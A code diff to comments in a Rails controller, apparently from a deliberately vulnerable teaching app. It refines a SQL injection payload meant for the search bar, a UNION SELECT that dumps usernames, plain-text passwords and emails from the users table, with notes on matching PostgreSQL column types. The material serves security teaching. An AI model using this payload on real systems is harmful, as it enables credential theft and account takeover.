@@ -10,15 +10,29 @@ class PostsController < ApplicationController
     #
     # --- ATTACK PAYLOAD (paste into the search bar) ---
     #
-    #   ' UNION SELECT id, username, password, email, bio, created_at, updated_at FROM users --
+    #   ' UNION SELECT NULL, NULL, username, password, email, NULL, NULL FROM users --
+    #
+    # PostgreSQL requires that every column pair in a UNION has compatible
+    # types.  The posts table schema is:
+    #   id(bigint), user_id(bigint), title(varchar), caption(text),
+    #   image_url(varchar), created_at(timestamp), updated_at(timestamp)
+    #
+    # So we place:
+    #   NULL        → position 1  (id bigint       — NULL fits any type)
+    #   NULL        → position 2  (user_id bigint  — NULL fits any type)
+    #   username    → position 3  (title varchar   — both varchar ✓)
+    #   password    → position 4  (caption text    — varchar fits text ✓)
+    #   email       → position 5  (image_url varchar — both varchar ✓)
+    #   NULL        → position 6  (created_at      — NULL fits any type)
+    #   NULL        → position 7  (updated_at      — NULL fits any type)
     #
     # The resulting SQL becomes:
-    #   SELECT * FROM posts WHERE title LIKE '%' UNION SELECT id, username,
-    #   password, email, bio, created_at, updated_at FROM users --%'
+    #   SELECT * FROM posts WHERE title LIKE '%'
+    #   UNION SELECT NULL, NULL, username, password, email, NULL, NULL FROM users
+    #   --%'
     #
-    # Because both SELECT statements return 7 columns, the database executes
-    # both and merges the results. User rows appear in the feed as if they
-    # were posts — but "title" now holds the username and "caption" holds
+    # The database merges both result sets. User rows appear in the feed as
+    # if they were posts — "title" shows the username and "caption" shows
     # the plain-text password of every account in the system.
     #
     # This attack chains directly with Vulnerability 3 (plain-text passwords):
